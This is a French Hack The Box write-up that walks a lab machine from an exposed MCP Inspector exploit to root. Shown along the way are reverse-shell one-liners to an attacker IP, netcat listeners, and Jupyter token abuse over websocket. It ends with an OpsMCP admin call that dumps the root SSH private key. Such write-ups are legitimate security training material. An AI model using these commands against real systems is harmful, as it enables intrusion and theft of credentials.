
Auteur : DoOm /ppporrkkky
https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de

![[Pasted image 20260802101232.png]]

une fois l'adresse obtenue on peut commencer la reconnaissance sur l’hôte cible avec nmap 

en essayant d'accéder au port 80 de la cible  on a  sa 

![[Pasted image 20260802101904.png]]
on a uns service lancer en localhost sur le port 8888 sur la machine local qui pourrait potentiellement servir de surface d'attaque mais c'est pas le truc chercher actuellement 

le scan nmap à donné l'ensemble des ports internet exposé vue récemment 

![[Pasted image 20260802102933.png]]

on a un serveur MCP sur le port 6274 accessible depuis internet 
une fois accéder on a : 

![[Pasted image 20260802102227.png]]

on essai de voir si la version  du service lancer à une version susceptible d’être exploiter en surface d'attaque 

![[Pasted image 20260802102454.png]]

on est sur la version 1.4.2 

![[Pasted image 20260802103946.png]]

on a la version vulnérable donc on peut chercher la Poc pour exploitation sur ce site : https://github.com/advisories/GHSA-232v-j27c-5pp6


![[Pasted image 20260802104041.png]]

la Poc utiliser ici serait une poc adapter à ce qu'on doit faire et à l'os  dans notre cas on est surement sur une machine linux et on veut un reverse shell  l'idéal serait d'envoyer , injecter les paramètres nécessaires à ce qu'on doit faire 


ou on peut utiliser cette POC en python içi : https://www.exploit-db.com/exploits/52625 
une foit le listener lancer ( nc -lvnp Port_attaquant) on peut lancer l'exploit avec les paramètres équivalent

![[Pasted image 20260802110913.png]] 
état du listenner 
![[Pasted image 20260802110944.png]] 
on a un shell  
maintenant  stabilisons le shell 

Pour stabiliser un reverse shell basique (type `bash -i >& /dev/tcp/...`), voici la méthode classique en 3 étapes :

**1. Upgrade en PTY complet via Python**
``` Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**2. Passer le shell en arrière-plan et ajuster le terminal local**

Une fois le PTY spawné, faire `Ctrl+Z` pour mettre le shell en background, puis sur ta machine attaquante :

```bash
stty raw -echo; fg
```

Cela désactive l'écho local et passe le terminal en mode raw — ça permet d'utiliser Ctrl+C, les flèches, l'autocomplétion, etc. dans le shell distant sans qu'il plante.

**3. Renseigner le terminal correctement**  
Après le `fg`, taper `Enter` deux fois, puis dans le shell distant :

```bash
export TERM=xterm
```

Ça active la coloration, `clear`, et les programmes interactifs comme `vim` ou `less`.

Une alternative encore plus simple si `rlwrap` est installé côté attaquant : lancer le listener avec 
```bash 
rlwrap nc -lvnp 4444
```

 dès le départ, ça donne déjà l'historique et l'édition de ligne sans upgrade Python.

une fois le shell stabiliser il faut rechercher des méthodes de mouvement latéral ou  d'escalade de privilège  en root 

on peut utiliser l'outils linpeas.sh pour le scan système et avoir les info du systèmes à l'instant t du scan

![[Pasted image 20260802113349.png]]

on a les processus croustillant du système

pour le   1 et 2 on voit que l'utilisateur analyst à lancer un serveur jupyter en localhost avec le token en dur   ici un mouvement latéral est possible pour avoir le shell du user analyst

au  3 et 4 on voit le root lancer des proccess cron si les script ou appli en question sont éditable ont peut avoir un shell root  
![[Pasted image 20260802121129.png]]

meme constat au niveau du param  5 de l'image si dessus 

le token vu recemment en dur sera celui utiliser pour l'interaction avec le service Jupiter 

avec jupyter on peut exercer un émulateur de terminal avec lequel on peut interagir avec le système notre but est de soit récupérer le flag via cette instance de shell ou d'avoir un reverse shell qui va nous faciliter la vie 

création du terminal 

```
curl -X POST 'http://127.0.0.1:8888/api/terminals' \  
>   -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \  
>   -H 'Content-Type: application/json' \  
>   -d '{"cwd":""}' \  
>   -i
```


![[Pasted image 20260802130546.png]]

la réponse du serveur 
``` json 
{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}
``` 

donc on a une session ouverte et on a id  du terminal avec le quel on va inter agir qui est 1

les commandes shell s'envoient via websocket l'outil utiliser içi est  websocat.x86_64-unknown-linux-musl disponible sur ce lien :
https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl

une fois obtenu on peut envoyer les requêtes  via terminal 

la commande de test  général est: 


```bash
./websocat.x86_64-unknown-linux-musl "ws://IP_cible:Port/terminals/websocket/1?token=votre token"
```
la commande pour nous est : 
```bash
./websocat.x86_64-unknown-linux-musl "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e  
1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

le résulat

![[Pasted image 20260802134006.png]]
on a une session avec l'utilisateur analyst
maintenant on va lister les home de analyst 

la commande :
```bash
echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl "ws://127.0.0.1:8888/terminal  
s/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```


![[Pasted image 20260802134809.png]]

maintenant on va essauer d'avoir le reverse-shell de l'utilisateur analyst


la commande du rev-shell  dans ce cas 
avant de lancer le rev-shell  il faut lancer le listener nc 
```bash
nc -lvnp 9000
```

```bash
echo '["stdin", "bash -i >& /dev/tcp/10.10.14.90/9000 0>&1\r"]' | ./websocat.x86_64-unknown-linux-musl "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

![[Pasted image 20260802135829.png]]

on a le shell on le stabilise avec la méthode vu précédemment  une fois stabiliser on recherche le flag 

![[Pasted image 20260802140226.png]]

on a le flag user ici dans le user.txt
![[Pasted image 20260802142840.png]]

en listant tout un fichier m'intrigue : .opsmcp_key 
![[Pasted image 20260802143939.png]]
on dirait c'est une clé pour un service config sur le serveur mais bons gardons cette info dans un coin 

on avait vu lors de l'execution de linepeas.sh sa : 
![[Pasted image 20260802141857.png]]
le root executait un fichier python avec :
l’interpréteur : /home/analyst/jupyter-env/bin/python3
et le fichier cible : /opt/opsmcp/server.py

notons que le dossier a  les initials du fichier .opsmcp_key donc  il yaurait une liaison entre les deux informations 

allons tecker le répertoire  /opt/opsmcp/ pour voir les permissions sur le fichier  server.py et si possible injecter du code si possible 

![[Pasted image 20260802142258.png]] 

server.py est une propriétés de l'utilisateur analyst affichons sa pour voir 
en se renseignant sur le service lancé : on a 

 **OpsMCP** est un serveur MCP (Model Context Protocol) orienté **opérations système** — concrètement c'est un serveur qui expose des outils d'administration système à un LLM (comme Claude) via le protocole MCP.

**Ce qu'il fait typiquement :**

- Exécuter des commandes système
- Lire/écrire des fichiers
- Gérer des processus
- Accéder à des logs
- Interagir avec des services (systemd, docker, etc.)
vu qu'il  est executer en root on peut avoir ou lancer des commandes système en mode root 

on va essayer d'abord d'inter-agir avec le serveur qui à comme config principal  **/opt/opsmcp/server.py**  
![[Pasted image 20260802143838.png]]
on a  déja la clé API 
![[Pasted image 20260802144018.png]]
on voit que la clé API valide et le fichier intriguant sont les mêmes

on a aussi l'endpint du serveur ici 
![[Pasted image 20260802144842.png]]
en le testant on a : 
![[Pasted image 20260802144916.png]]

ave le Token on a 

![[Pasted image 20260802145907.png]]


sur la repose du serveur on a pas toutes les outils qu'on peut appeler 
dans server.py on ceci : 

![[Pasted image 20260802150938.png]]

ici le but est déclencher cette partie du code 

![[Pasted image 20260802151116.png]]

parce que l'accès en ssh root avec le mot de passe $6$rounds=656000$saltsalt$hashedpassword n' est pa possible 
![[Pasted image 20260802151553.png]]

la commande curl pour l'obtention de la clé privée ssh root 

```bash
curl -X POST http://127.0.0.1:5000/tools/call \  
-H "Content-Type: application/json" \  
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \  
-d '{  
"name": "ops._admin_dump",  
"arguments": {  
"target": "ssh_keys",  
"confirm": true  
}  
}'
```


une fois lancer on a cette sortie : la clé ssh root brute 

![[Pasted image 20260802153928.png]]

en copiant la clé cible  dans un fichier vide il faut lui appliquer plusieur filtre de conversion 
ce script le fait  
j'ai enregister la sorti de la clé brut dans un fichier nommé enigma_root_key 

```python 
#!/usr/bin/env python3
import os
import subprocess
import sys

def sanitize_key(input_path="enigma_root_key"):
    try:
        print(f"[*] Traitement du fichier : {input_path}")

        # 1. Utilisation de dos2unix en arrière-plan s'il est installé pour nettoyer les retours chariots (CRLF -> LF)
        try:
            subprocess.run(["dos2unix", input_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            print("[+] Conversion dos2unix effectuée avec succès.")
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[-] Avertissement : 'dos2unix' non disponible, nettoyage manuel des retours chariots en Python...")

        # 2. Lecture du contenu du fichier
        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # 3. Nettoyage des caractères échappés et résiduels
        content = content.replace("\\n", "\n")  # Remplace les \n textuels par de vrais sauts de ligne
        content = content.replace("\r\n", "\n") # Force le format Unix
        content = content.rstrip("\\").strip()  # Supprime le '\' final et les espaces superflus

        # 4. S'assurer que le fichier se termine proprement par un unique saut de ligne
        content = content.rstrip("\n") + "\n"

        # 5. Réécriture propre du fichier
        with open(input_path, "w", encoding="utf-8") as f:
            f.write(content)

        # 6. Application des permissions strictes requises par SSH (chmod 400)
        os.chmod(input_path, 0o400)
        print(f"[+] Clé nettoyée et permissions (400) appliquées sur '{input_path}'.")

    except Exception as e:
        print(f"[-] Erreur critique : {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    target_file = sys.argv[1] if len(sys.argv) > 1 else "enigma_root_key"
    sanitize_key(target_file)
```

```python
python3 sanitize_key.py enigma_root_key
```

![[Pasted image 20260802154548.png]]


et en suite la connextion  au serveur cible  de mon  coté 

```bash
ssh -i enigma_root_key root@10.129.245.216
```

![[Pasted image 20260802154714.png]]
on a bien  l'accès root  
![[Pasted image 20260802154814.png]]
en le flag tand chercher 


les recommandations futurs  à l'admin du site serait de régulièrent mettre à jour ces applications et serveur et de  ne pas implémenter des fonctionalité critiques comme le fait de récuperer la clé ssh root 